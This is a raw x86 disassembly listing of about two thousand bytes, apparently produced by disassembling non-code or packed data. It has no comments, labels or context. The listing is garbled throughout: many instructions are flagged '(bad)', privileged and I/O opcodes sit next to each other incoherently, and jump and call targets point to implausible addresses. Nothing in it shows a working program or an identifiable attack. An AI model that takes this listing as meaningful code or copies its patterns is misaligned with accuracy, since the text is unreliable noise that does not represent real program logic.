  4303ee:	add    al,al
  4303f0:	xor    BYTE PTR [eax+0x4f],dl
  4303f3:	inc    ebp
  4303f4:	add    BYTE PTR [ebx+0xfcd88b],cl
  4303fa:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  430400:	add    DWORD PTR [ecx+0x458be845],ecx
  430406:	fmul   DWORD PTR [ebx+0x8bb800]
  43040c:	cld    
  43040d:	call   0xd82ed2
  430412:	dec    DWORD PTR [ebx+0x109ee8ff]
  430418:	add    al,al
  43041a:	push   eax
  43041b:	es inc ebp
  43041d:	inc    ebp
  43041e:	mov    ecx,DWORD PTR [ebx+0xd89c]
  430424:	dec    DWORD PTR [ebx-0x3ff70301]
  43042a:	mov    DWORD PTR gs:[eax],eax
  43042d:	call   0x8c134967
  430432:	sar    BYTE PTR [eax-0x17baffd8],0x8b
  430439:	sub    eax,ebx
  43043b:	add    BYTE PTR [eax],al
  43043d:	mov    ecx,DWORD PTR [ebx-0x3fef0318]
  430443:	inc    ebp
  430444:	push   ebp
  430445:	mov    ebp,eax
  430447:	shr    BYTE PTR [ecx],1
  430449:	ret    
  43044a:	add    dh,al
  43044c:	mov    eax,ecx
  43044e:	cld    
  43044f:	test   BYTE PTR [eax+0x101],al
  430455:	inc    ebp
  430456:	xor    BYTE PTR [ebx],dh
  430458:	push   edi
  430459:	mov    ecx,0xffe48d89
  43045e:	inc    ebp
  43045f:	enter  0x4d8b,0xfc
  430463:	mov    eax,ebx
  430465:	or     BYTE PTR [ebx+0x38732c1],bl
  43046b:	add    DWORD PTR [ebp-0xbac000],ecx
  430471:	add    al,ch
  430473:	add    BYTE PTR [ecx],ch
  430475:	inc    DWORD PTR [eax]
  430477:	cld    
  430478:	mov    edi,DWORD PTR [ebp-0xc]
  43047b:	mov    esi,DWORD PTR [ebp-0x4]
  43047e:	xor    edx,DWORD PTR [eax+0x8d0103]
  430484:	and    BYTE PTR [ebp+0x50e800ff],bl
  43048a:	sub    DWORD PTR [ebp+0x0],eax
  43048d:	mov    edi,edi
  43048f:	test   al,0xe4
  430491:	add    BYTE PTR [ebp-0x1],cl
  430494:	xor    ebp,eax
  430496:	add    esp,DWORD PTR [esi]
  430498:	cmp    eax,DWORD PTR [eax]
  43049a:	jne    0x4304e9
  43049c:	(bad)  
  43049d:	mov    ebx,eax
  43049f:	pushf  
  4304a0:	add    BYTE PTR [eax],al
  4304a2:	add    BYTE PTR [ecx-0x37474bb],cl
  4304a8:	or     BYTE PTR [eax+0x8401c3],bh
  4304ae:	fwait
  4304af:	jne    0x4304e3
  4304b1:	xor    ecx,DWORD PTR [ecx+0x457c088d]
  4304b7:	inc    DWORD PTR [ebp-0x74d68b18]
  4304bd:	add    BYTE PTR [eax+0x33fc4d8b],bh
  4304c3:	or     BYTE PTR [ebp+0x72000801],0x30
  4304ca:	add    BYTE PTR [edi+0x45],dl
  4304cd:	or     DWORD PTR [ebx-0x3c95471c],0xffffffff
  4304d4:	gs test ebp,ecx
  4304d7:	je     0x430504
  4304d9:	mov    eax,DWORD PTR [ebx]
  4304db:	cld    
  4304dc:	sar    BYTE PTR [eax+0x3b0145],1
  4304e2:	pcmpeqw mm4,mm2
  4304e5:	xor    edi,edi
  4304e7:	lea    ecx,[ebx-0x23927470]
  4304ed:	add    BYTE PTR [ebp+0x50],cl
  4304f0:	cmp    eax,DWORD PTR [ebp+0x75]
  4304f3:	mov    ebp,DWORD PTR [eax-0x68]
  4304f6:	test   DWORD PTR [eax],eax
  4304f8:	clc    
  4304f9:	push   DWORD PTR [ebp-0x1]
  4304fc:	lea    ecx,[eax]
  4304fe:	int3   
  4304ff:	inc    ebp
  430500:	call   0xfb3690
  430505:	jne    0x4304ff
  430507:	xor    edi,DWORD PTR [ebp-0x41]
  43050a:	jmp    0x43057e
  43050c:	mov    eax,DWORD PTR [eax]
  43050e:	mov    eax,0x339545c7
  430513:	inc    DWORD PTR [ebx]
  430515:	push   DWORD PTR [ecx]
  430517:	inc    ecx
  430518:	mov    eax,DWORD PTR [eax]
  43051a:	jmp    0x43056c
  43051c:	mov    eax,DWORD PTR [ebp-0x3c]
  43051f:	mov    eax,eax
  430521:	cld    
  430522:	clc    
  430523:	ret    
  430524:	test   bh,al
  430526:	pop    es
  430527:	xchg   ebp,eax
  430528:	add    bh,bh
  43052a:	inc    ebp
  43052b:	dec    DWORD PTR [edi]
  43052d:	sub    ebp,DWORD PTR [ebx]
  43052f:	add    BYTE PTR [eax],al
  430531:	push   eax
  430532:	jbe    0x430589
  430534:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  43053a:	or     al,0xcf
  43053c:	inc    eax
  43053d:	enter  0x745,0x72
  430541:	inc    ebp
  430542:	mov    eax,DWORD PTR [ecx]
  430544:	int3   
  430545:	add    BYTE PTR [ebp-0x75],al
  430548:	xor    DWORD PTR [eax+0x33c74d9c],edi
  43054e:	ror    BYTE PTR [ebp+0x72f80885],1
  430554:	inc    ebp
  430555:	add    BYTE PTR [ebx-0x3c7423bb],cl
  43055b:	fadd   st,st(6)
  43055d:	rol    BYTE PTR [ebp+0x12],0x8b
  430561:	inc    ebp
  430562:	fmul   QWORD PTR [ebx-0x3c39233d]
  430568:	inc    ebp
  430569:	test   bh,al
  43056b:	fwait
  43056c:	clc    
  43056d:	xor    al,BYTE PTR [ebp+0x45dcf889]
  430573:	inc    ebp
  430574:	xor    esi,DWORD PTR [ebx]
  430576:	pushf  
  430577:	mov    ecx,0xffb48dc7
  43057c:	test   eax,ecx
  43057e:	clc    
  43057f:	dec    ebp
  430580:	inc    ebp
  430581:	mov    edi,DWORD PTR ds:0xc7c19c08
  430587:	xchg   BYTE PTR [esi+edi*8-0x807007b],ah
  43058e:	inc    ebp
  43058f:	inc    ebp
  430590:	aas    
  430591:	mov    ebx,DWORD PTR [eax+ecx*1+0x18e8c8c7]
  430598:	test   DWORD PTR [ecx],esi
  43059a:	clc    
  43059b:	pushf  
  43059c:	inc    ebp
  43059d:	dec    DWORD PTR [ebx-0x3cba0f04]
  4305a3:	push   eax
  4305a4:	mov    BYTE PTR [edx],0x7d
  4305a7:	add    BYTE PTR [ebx],bh
  4305a9:	mov    ecx,DWORD PTR [edi]
  4305ab:	mov    DWORD PTR [eax],ebx
  4305ad:	les    eax,FWORD PTR [eax]
  4305af:	adc    ebp,ecx
  4305b1:	dec    ebp
  4305b2:	add    DWORD PTR [ebx-0x34ba3c00],ecx
  4305b8:	mov    ecx,esi
  4305ba:	lock or al,cl
  4305bd:	clc    
  4305be:	inc    ebp
  4305bf:	add    esi,DWORD PTR [ebx]
  4305c1:	jge    0x4305c6
  4305c3:	xor    edi,DWORD PTR [ebx]
  4305c5:	cmp    ecx,DWORD PTR [edi]
  4305c7:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  4305cc:	mov    edi,DWORD PTR [ecx]
  4305ce:	test   al,0xcc
  4305d0:	dec    ebp
  4305d1:	test   BYTE PTR [ebx],dh
  4305d3:	pop    es
  4305d4:	xor    eax,DWORD PTR [eax]
  4305d6:	add    ecx,DWORD PTR [esi]
  4305d8:	add    ecx,eax
  4305da:	psraw  mm0,mm1
  4305dd:	sub    BYTE PTR [ebp+0x38],cl
  4305e0:	mov    edi,DWORD PTR [ebx]
  4305e2:	lock int3 
  4305e4:	shl    edx,1
  4305e6:	rol    BYTE PTR [ebp+0xc],1
  4305e9:	mov    DWORD PTR [ebp-0x24],0xf8038533
  4305f0:	jmp    0x75063a
  4305f5:	pushf  
  4305f6:	inc    ebp
  4305f7:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  4305fd:	xor    ecx,ebx
  4305ff:	add    ecx,esi
  430601:	mov    esi,eax
  430603:	enter  0x45af,0x8b
  430607:	xor    ecx,eax
  430609:	add    edx,DWORD PTR [ebp-0x77]
  43060c:	sub    ecx,DWORD PTR [eax]
  43060e:	cmp    eax,DWORD PTR [ebp+0x77]
  430611:	ror    DWORD PTR [ebx-0x76385764],1
  430617:	test   al,0x0
  430619:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  43061f:	cmp    al,0x33
  430621:	pushf  
  430622:	xor    eax,edi
  430624:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  43062b:	inc    ebp
  43062c:	dec    ebp
  43062d:	mov    ebx,DWORD PTR ds:[eax+esi*8-0x2f432e39]
  430635:	test   DWORD PTR ds:0xeb4545f8,eax
  43063b:	cmp    BYTE PTR [ebx+0x4d8ba49c],cl
  430641:	fdiv   QWORD PTR [ebx]
  430643:	dec    ebp
  430644:	xor    esi,DWORD PTR [ebx]
  430646:	add    eax,DWORD PTR [ebx]
  430648:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  43064e:	dec    ebp
  43064f:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  430655:	out    dx,eax
  430656:	rol    BYTE PTR [eax],1
  430658:	add    eax,0xebc8458b
  43065d:	dec    ebp
  43065e:	mov    ebp,DWORD PTR [ebx]
  430660:	mov    esp,0x33f84d8b
  430665:	ret    
  430666:	xor    eax,esi
  430668:	add    ecx,eax
  43066a:	add    eax,DWORD PTR [edx+0xc1010f]
  430670:	dec    ebp
  430671:	inc    ebp
  430672:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  430678:	ror    bl,1
  43067a:	add    eax,0xebc645ce
  43067f:	scas   eax,DWORD PTR es:[edi]
  430680:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  430686:	xor    ebp,DWORD PTR [ebx]
  430688:	xor    edi,DWORD PTR [ebx]
  43068a:	add    esi,DWORD PTR [edi+0x3]
  43068d:	mov    ecx,DWORD PTR [edi]
  43068f:	clc    
  430690:	rol    ebx,0x4d
  430693:	(bad)  
  430694:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  43069b:	mov    ah,0x45
  43069d:	dec    ebp
  43069e:	jbe    0x4306d3
  4306a0:	mov    esi,DWORD PTR [ebx]
  4306a2:	call   0x334653aa
  4306a7:	rdpmc  
  4306a9:	rol    DWORD PTR [ebx],0x4d
  4306ac:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  4306b2:	inc    ebp
  4306b3:	ror    BYTE PTR [ebx+0x45450808],1
  4306b9:	jmp    0x10b0749
  4306be:	inc    ebp
  4306bf:	inc    ebp
  4306c0:	(bad)  
  4306c1:	mov    ebx,eax
  4306c3:	clc    
  4306c4:	test   ebx,eax
  4306c6:	clc    
  4306c7:	retf   
  4306c8:	inc    ebp
  4306c9:	into   
  4306ca:	mov    esi,0x8b85afec
  4306d0:	clc    
  4306d1:	enter  0x5545,0x33
  4306d5:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  4306dc:	ret    
  4306dd:	mov    ah,0xc6
  4306df:	addr16 push 0x338b4545
  4306e5:	clc    
  4306e6:	add    eax,ebx
  4306e8:	loopne 0x4306b5
  4306ea:	dec    ebp
  4306eb:	into   
  4306ec:	mov    al,dh
  4306ee:	or     BYTE PTR [edi-0x37ff748e],ch
  4306f4:	inc    ebp
  4306f5:	push   ebp
  4306f6:	mov    ebp,DWORD PTR [ebx]
  4306f8:	in     al,dx
  4306f9:	cmp    eax,ebx
  4306fb:	ja     0x430742
  4306fd:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  430703:	inc    ebp
  430704:	fwait
  430705:	mov    esi,DWORD PTR [edx]
  430707:	clc    
  430708:	mov    bl,al
  43070a:	xlat   BYTE PTR ds:[ebx]
  43070b:	retf   
  43070c:	inc    ebp
  43070d:	into   
  43070e:	mov    eax,esi
  430710:	in     al,dx
  430711:	scas   eax,DWORD PTR es:[edi]
  430712:	retf   
  430713:	mov    ecx,DWORD PTR [ebp-0x38]
  430716:	mov    edx,DWORD PTR [ebp-0x24]
  430719:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8865]
  430720:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  430727:	mov    eax,DWORD PTR [ebx]
  430729:	clc    
  43072a:	loopne 0x4306ef
  43072c:	push   ebp
  43072d:	retf   
  43072e:	mov    dh,al
  430730:	adc    esi,ecx
  430732:	jb     0x4306e3
  430734:	add    BYTE PTR [ebx+0x558bc845],cl
  43073a:	in     al,dx
  43073b:	sub    eax,ebx
  43073d:	cmp    ecx,ebx
  43073f:	mov    eax,esi
  430741:	mov    esp,0x45af03ce
  430746:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  43074c:	mov    eax,ebx
  43074e:	in     al,dx
  43074f:	into   
  430750:	dec    ebp
  430751:	(bad)  
  430752:	xor    ebp,DWORD PTR [edi+0x80f8903]
  430758:	rol    DWORD PTR [ebp+0x4d],0x89
  43075c:	xor    esp,esp
  43075e:	sub    eax,DWORD PTR [ebp-0x75]
  430761:	add    ebp,esp
  430763:	mov    al,0x55
  430765:	inc    ebp
  430766:	xor    esi,DWORD PTR [ecx]
  430768:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  43076f:	inc    ebp
  430770:	xor    esi,DWORD PTR [edx]
  430772:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  430779:	test   DWORD PTR [eax],eax
  43077b:	clc    
  43077c:	enter  0x8645,0x33
  430780:	inc    DWORD PTR [ebx]
  430782:	(bad)  
  430783:	jmp    0x4307ca
  430785:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  43078b:	inc    ebp
  43078c:	(bad)  
  43078d:	mov    ebp,DWORD PTR [edi-0x277b7424]
  430793:	fwait
  430794:	retf   
  430795:	xor    al,cl
  430797:	mov    BYTE PTR [ebp+0xb],cl
  43079a:	lea    eax,[ebp+0x8]
  43079d:	xor    esi,DWORD PTR [edx+0x3]
  4307a0:	add    al,ah
  4307a2:	inc    ebp
  4307a3:	dec    ebp
  4307a4:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  4307aa:	gs add ch,cl
  4307ad:	inc    ebp
  4307ae:	sub    ecx,DWORD PTR [edx+0x4df00b03]
  4307b4:	inc    ebp
  4307b5:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  4307bb:	push   ebp
  4307bc:	(bad)  
  4307bd:	mov    BYTE PTR [edi+0xf723b11],ch
  4307c3:	add    ch,ch
  4307c5:	inc    ebp
  4307c6:	dec    DWORD PTR [ebx-0x34332775]
  4307cc:	add    al,0x4d
  4307ce:	inc    ebp
  4307cf:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  4307d5:	fwait
  4307d6:	add    DWORD PTR [edx],esi
  4307d8:	add    BYTE PTR [ebx+0x4d00c000],cl
  4307de:	push   DWORD PTR [ebx]
  4307e0:	int3   
  4307e1:	xor    eax,DWORD PTR [eax]
  4307e3:	add    edx,DWORD PTR [eax+0x3]
  4307e6:	mov    DWORD PTR [edi],ecx
  4307e8:	call   0x4288c8ae
  4307ed:	mov    DWORD PTR [ebp-0x20],esp
  4307f0:	add    BYTE PTR [ebp+0x7d],al
  4307f3:	mov    eax,DWORD PTR [eax]
  4307f5:	in     al,0x15
  4307f7:	ret    
  4307f8:	iret   
  4307f9:	(bad)  
  4307fa:	enter  0x14af,0x8b
  4307fe:	(bad)  
  4307ff:	in     al,dx
  430800:	or     bl,cl
  430802:	adc    cl,al
  430804:	push   ebp
  430805:	dec    ebp
  430806:	inc    eax
  430807:	mov    edx,DWORD PTR [ebp-0x20]
  43080a:	jb     0x4307d7
  43080c:	mov    ecx,esi
  43080e:	cld    
  43080f:	scas   eax,DWORD PTR es:[edi]
  430810:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  430817:	mov    BYTE PTR [eax],0x8c
  43081a:	push   0xffffff9b
  43081c:	push   edi
  43081d:	xor    dl,BYTE PTR [eax+0x3b]
  430820:	mov    ecx,DWORD PTR [edi]
  430822:	call   0x8c424d85
  430827:	mov    eax,eax
  430829:	in     al,dx
  43082a:	jge    0x430879
  43082c:	mov    DWORD PTR [ebx],esi
  43082e:	int3   
  43082f:	add    eax,DWORD PTR [ebp+0xf]
  430832:	xor    eax,ecx
  430834:	(bad)  
  430835:	dec    ebp
  430836:	pushf  
  430837:	xor    ecx,esi
  430839:	add    edi,DWORD PTR [edi]
  43083b:	mov    eax,DWORD PTR [ebp-0x38]
  43083e:	(bad)  
  43083f:	test   dh,dl
  430841:	fwait
  430842:	add    esi,DWORD PTR [edx]
  430844:	jmp    0x4307cf
  430846:	mov    cl,al
  430848:	add    eax,0x14330f45
  43084d:	mov    ecx,0xff468d80
  430852:	jmp    0xc990181f
  430857:	mov    edx,ecx
  430859:	rol    BYTE PTR [ebp+0x330155],1
  43085f:	add    ecx,DWORD PTR [ebp+0xf]
  430862:	xor    eax,edx
  430864:	(bad)  
  430865:	ror    DWORD PTR [eax],0x86
  430868:	jb     0x430867
  43086a:	add    bh,bh
  43086c:	clc    
  43086d:	inc    ebp
  43086e:	jb     0x4308da
  430870:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  430876:	xor    DWORD PTR [ebx+0xc7d89c],ecx
  43087c:	shr    BYTE PTR [eax-0x3d],0x30
  430880:	clc    
  430881:	add    BYTE PTR [ebp+0x75],al
  430884:	xor    DWORD PTR [edx-0x64],ebp
  430887:	inc    edi
  430889:	adc    al,0xe8
  43088b:	inc    ebp
  43088c:	test   DWORD PTR [ebp-0x7cba8b08],eax
  430892:	mov    ecx,DWORD PTR [eax]
  430894:	cld    
  430895:	or     DWORD PTR [ebp-0x34],0x33
  430899:	jbe    0x43089e
  43089b:	mov    edx,DWORD PTR [ecx+0x2b]
  43089e:	dec    ebp
  43089f:	mov    cl,BYTE PTR [ebx+0x45d801]
  4308a5:	mov    BYTE PTR [ebx],dh
  4308a7:	mov    eax,DWORD PTR [ebx]
  4308a9:	or     BYTE PTR [ecx+0x3b],dl
  4308ac:	dec    ebp
  4308ad:	int3   
  4308ae:	xor    ebp,edi
  4308b0:	add    eax,DWORD PTR [ebp+0x51]
  4308b3:	mov    ecx,DWORD PTR [ebp-0x28]
  4308b6:	xor    eax,DWORD PTR [eax]
  4308b8:	add    ebp,DWORD PTR [eax+0x51]
  4308bb:	adc    BYTE PTR [eax+0x0],0x8b
  4308bf:	add    BYTE PTR [ebx+0x4d18fcff],cl
  4308c5:	inc    ebp
  4308c6:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  4308cc:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  4308d2:	dec    ebp
  4308d3:	mov    esi,DWORD PTR [ebx]
  4308d5:	hlt    
  4308d6:	add    eax,ebx
  4308d8:	push   ecx
  4308d9:	inc    ebp
  4308da:	dec    ebp
  4308db:	(bad)  
  4308dc:	call   esi
  4308de:	in     al,0xc7
  4308e0:	retf   
  4308e1:	mov    al,ds:0xc5ff3dce
  4308e6:	adc    al,0xc6
  4308e8:	inc    ebp
  4308e9:	and    eax,0x9c0f4c85
  4308ee:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  4308f5:	cmp    BYTE PTR [ebx+0x38],0x0
  4308f9:	mov    dh,0xc7
  4308fb:	cmp    eax,eax
  4308fd:	jne    0x45440149
  430903:	mov    esi,DWORD PTR [ebx]
  430905:	mov    eax,0x848bcb9c
  43090a:	rcr    BYTE PTR [ebx-0x7c7fcd0f],0x65
  430911:	or     BYTE PTR [edi],cl
  430913:	(bad)  
  430914:	dec    ebp
  430915:	inc    edi
  430916:	add    bh,0x54
  430919:	or     cl,ch
  43091b:	test   DWORD PTR [eax+0x4d4501f8],ecx
  430921:	add    BYTE PTR [eax-0x1638ab64],0xbc
  430928:	mov    BYTE PTR [ebp+0x45a5f802],dh
  43092e:	(bad)  
  43092f:	cmp    eax,0x89839cff
  430934:	je     0x43091a
  430936:	inc    DWORD PTR [ebp+0x0]
  430939:	mov    ecx,DWORD PTR [ebp-0x340018]
  43093f:	into   
  430940:	dec    DWORD PTR [ebx-0x7f72431c]
  430946:	push   0x5000ff01
  43094b:	retf   
  43094c:	inc    ebp
  43094d:	into   
  43094e:	dec    DWORD PTR [ebx-0x343f3ff4]
  430954:	push   eax
  430955:	into   
  430956:	call   0x4b0de6
  43095b:	retf   
  43095c:	add    dh,cl
  43095e:	add    bh,bh
  430960:	mov    DWORD PTR [eax+ecx*1],edx
  430963:	clc    
  430964:	inc    ebp
  430965:	inc    ebp
  430966:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  43096c:	push   0x1
  43096e:	push   edi
  43096f:	add    BYTE PTR [eax-0x35],dl
  430972:	mov    ecx,esi
  430974:	cld    
  430975:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  43097b:	into   
  43097c:	ror    BYTE PTR [ebx+0x75000800],0x50
  430983:	xor    eax,DWORD PTR [ebp+0x3]
  430986:	jne    0x4309d9
  430988:	call   DWORD PTR [eax-0x3c]
  43098b:	mov    DWORD PTR [ecx-0x18],edx
  43098e:	mov    edi,edi
  430990:	call   0x8b464f19
  430995:	add    ah,ah
  430997:	rol    BYTE PTR [ebp-0x7c],0xeb
  43099b:	add    edi,edi
  43099d:	add    al,ch
  43099f:	inc    ebp
  4309a0:	push   ecx
  4309a1:	cmp    al,0x8b
  4309a3:	pushf  
  4309a4:	(bad)  
  4309a5:	mov    DWORD PTR [ebp-0x50],0xf8e485c7
  4309ac:	test   DWORD PTR [ebp-0x8],ecx
  4309af:	add    BYTE PTR [ebp+0x54],0x32
  4309b3:	jmp    0x8bcc9254
  4309b8:	in     al,dx
  4309b9:	or     BYTE PTR [ebp-0xf],al
  4309bc:	xor    eax,DWORD PTR [eax+0x4f896503]
  4309c2:	hlt    
  4309c3:	mov    eax,DWORD PTR [ebp-0x50]
  4309c6:	xor    esi,ecx
  4309c8:	add    eax,DWORD PTR [eax+0x4f086589]
  4309ce:	inc    ebp
  4309cf:	adc    ecx,0x68
  4309d2:	pushf  
  4309d3:	inc    edi
  4309d5:	add    al,ch
  4309d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4309d8:	test   edi,edi
  4309da:	clc    
  4309db:	inc    DWORD PTR [ebp-0x73]
  4309de:	cmp    al,0x74
  4309e0:	pushf  
  4309e1:	inc    edi
  4309e3:	push   ecx
  4309e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4309e5:	jne    0x43096c
  4309e7:	push   eax
  4309e8:	clc    
  4309e9:	test   DWORD PTR [ebp-0x1],eax
  4309ec:	call   FWORD PTR ds:[ebx+ecx*4+0x70b4c4c7]
  4309f4:	test   DWORD PTR [ebx+0x574510f8],eax
  4309fa:	cmp    BYTE PTR [edx],bl
  4309fc:	pushf  
  4309fd:	add    BYTE PTR [ebx+0x4d80e468],cl
  430a03:	add    BYTE PTR [ebx],dh
  430a05:	inc    ebp
  430a06:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  430a0c:	enter  0x8401,0x0
  430a10:	add    al,BYTE PTR [eax]
  430a12:	add    bh,bh
  430a14:	out    dx,eax
  430a15:	sbb    BYTE PTR [eax],al
  430a17:	dec    ebp
  430a18:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  430a1e:	sub    esi,DWORD PTR [ebx]
  430a20:	mov    ebp,DWORD PTR [eax-0x8]
  430a23:	add    bl,0x0
  430a26:	(bad)  
  430a27:	cmp    eax,ecx
  430a29:	or     BYTE PTR [edx+0x750114],al
  430a2f:	inc    DWORD PTR [ebp+0x18]
  430a32:	mov    eax,DWORD PTR [ebp-0x8]
  430a35:	mov    ebx,eax
  430a37:	(bad)  
  430a38:	retf   
  430a39:	inc    ebp
  430a3a:	into   
  430a3b:	mov    esi,eax
  430a3d:	int3   
  430a3e:	scas   eax,DWORD PTR es:[edi]
  430a3f:	push   es
  430a40:	mov    esi,DWORD PTR [ebp-0xc]
  430a43:	call   DWORD PTR [ebp+0x18]
  430a46:	sub    edi,DWORD PTR [ebp+0x3b]
  430a49:	mov    esi,DWORD PTR [edi-0x34]
  430a4c:	mov    eax,DWORD PTR [ebp-0x8]
  430a4f:	xor    ebx,eax
  430a51:	pushf  
  430a52:	mov    bh,0xbc
  430a55:	fadd   QWORD PTR [eax]
  430a57:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  430a5d:	mov    esi,DWORD PTR [ebx]
  430a5f:	in     al,0x33
  430a61:	ret    
  430a62:	add    eax,esi
  430a64:	add    eax,DWORD PTR [ebp+0xf]
  430a67:	mov    eax,ecx
  430a69:	in     al,0x4d
  430a6b:	ret    
  430a6c:	mov    eax,esi
  430a6e:	in     al,dx
  430a6f:	inc    ebp
  430a70:	rol    edi,1
  430a72:	sar    al,1
  430a74:	or     BYTE PTR [ebp+0x45e9f845],al
  430a7a:	add    BYTE PTR [ebx],dh
  430a7c:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  430a83:	test   ebx,eax
  430a85:	clc    
  430a86:	retf   
  430a87:	inc    ebp
  430a88:	into   
  430a89:	cmp    eax,0xc7af9cc6
  430a8e:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  430a95:	inc    ebp
  430a96:	cmp    edi,DWORD PTR [edi]
  430a98:	ja     0x430a36
  430a9a:	mov    eax,edi
  430a9c:	mov    esp,0x458567a8
  430aa1:	clc    
  430aa2:	mov    eax,DWORD PTR [ebp-0x8]
  430aa5:	mov    eax,ebx
  430aa7:	in     al,dx
  430aa8:	retf   
  430aa9:	ret    
  430aaa:	into   
  430aab:	mov    dh,0x7d
  430aae:	scas   eax,DWORD PTR es:[edi]
  430aaf:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  430ab5:	add    BYTE PTR [ebx],ch
  430ab7:	jmp    0xba0bf7
  430abc:	mov    eax,DWORD PTR [ebp-0x5c]
  430abf:	mov    eax,DWORD PTR [ebp-0x14]
  430ac2:	inc    ebp
  430ac3:	enter  0x458b,0xf8
  430ac7:	xor    eax,ebx
  430ac9:	add    ecx,ebx
  430acb:	cmp    ecx,esi
  430acd:	shufps xmm7,xmm4,0xaf
  430ad1:	add    BYTE PTR [ebx+0x55e8f48b],cl
  430ad7:	dec    ebp
  430ad8:	sub    esi,DWORD PTR [ebx]
  430ada:	cmp    esi,DWORD PTR [ebx]
  430adc:	ja     0x430ae1
  430ade:	mov    eax,DWORD PTR [ebx]
  430ae0:	lods   al,BYTE PTR ds:[esi]
  430ae1:	mov    db0,ecx
  430ae4:	inc    ebp
  430ae5:	dec    ebp
  430ae6:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  430aec:	retf   
  430aed:	rol    dh,1
  430aef:	or     al,0xce
  430af1:	inc    ebp
  430af2:	scas   eax,DWORD PTR es:[edi]
  430af3:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  430af9:	add    BYTE PTR [ebx],ch
  430afb:	add    BYTE PTR [ebx],bh
  430afd:	inc    ebp
  430afe:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  430b04:	inc    ebp
  430b05:	retf   
  430b06:	mov    ecx,esi
  430b08:	clc    
  430b09:	(bad)  
  430b0a:	retf   
  430b0b:	scas   eax,DWORD PTR es:[edi]
  430b0c:	ret    
  430b0d:	mov    ecx,esi
  430b0f:	hlt    
  430b10:	(bad)  
  430b11:	push   ebp
  430b12:	scas   eax,DWORD PTR es:[edi]
  430b13:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  430b19:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  430b1f:	add    BYTE PTR [ebx],al
  430b21:	mov    eax,eax
  430b23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430b24:	inc    ebp
  430b25:	dec    ebp
  430b26:	xor    DWORD PTR [ebx],esi
  430b28:	pushf  
  430b29:	xor    ecx,DWORD PTR [ecx+0x4503d003]
  430b2f:	rdmsr  
  430b31:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  430b39:	sar    eax,1
  430b3b:	rol    BYTE PTR [ebp+0x5],1
  430b3e:	xor    eax,DWORD PTR [ebp+0x3]
  430b41:	jmp    0x430b2e
  430b43:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  430b49:	xor    eax,DWORD PTR [ebp+0x33]
  430b4c:	mov    eax,DWORD PTR [ebx]
  430b4e:	rol    BYTE PTR [ebx],1
  430b50:	test   BYTE PTR [edi],cl
  430b52:	fwait
  430b53:	shl    DWORD PTR [edx],0x4d
  430b56:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  430b5c:	xor    edx,eax
  430b5e:	add    eax,DWORD PTR ds:0xeb4d45e0
  430b64:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  430b6a:	add    BYTE PTR [ebx],dh
  430b6c:	inc    ebp
  430b6d:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  430b73:	rdpmc  
  430b75:	rol    DWORD PTR [ebx],0x4d
  430b78:	loopne 0x430b05
  430b7a:	push   ebp
  430b7b:	in     al,dx
  430b7c:	mov    cl,dl
  430b7e:	adc    eax,edx
  430b80:	jb     0x430b87
  430b82:	add    BYTE PTR [ebp+0x45],al
  430b85:	jmp    0x430b12
  430b87:	mov    ebx,eax
  430b89:	test   al,0xcb
  430b8b:	dec    ebp
  430b8c:	dec    ebp
  430b8d:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  430b93:	add    ebx,DWORD PTR [ebx-0x743ecdf1]
  430b99:	dec    ebp
  430b9a:	mov    al,0x8b
  430b9c:	dec    ebp
  430b9d:	in     al,dx
  430b9e:	xor    edx,ecx
  430ba0:	xor    edx,eax
  430ba2:	add    eax,DWORD PTR [ebp+0x3]
  430ba5:	jbe    0x430bb6
  430ba7:	mov    eax,ecx
  430ba9:	test   al,0x45
  430bab:	dec    ebp
  430bac:	mov    DWORD PTR [ebx],esi
  430bae:	loopne 0x430be3
  430bb0:	inc    ebp
  430bb1:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  430bb7:	rol    esi,0x45
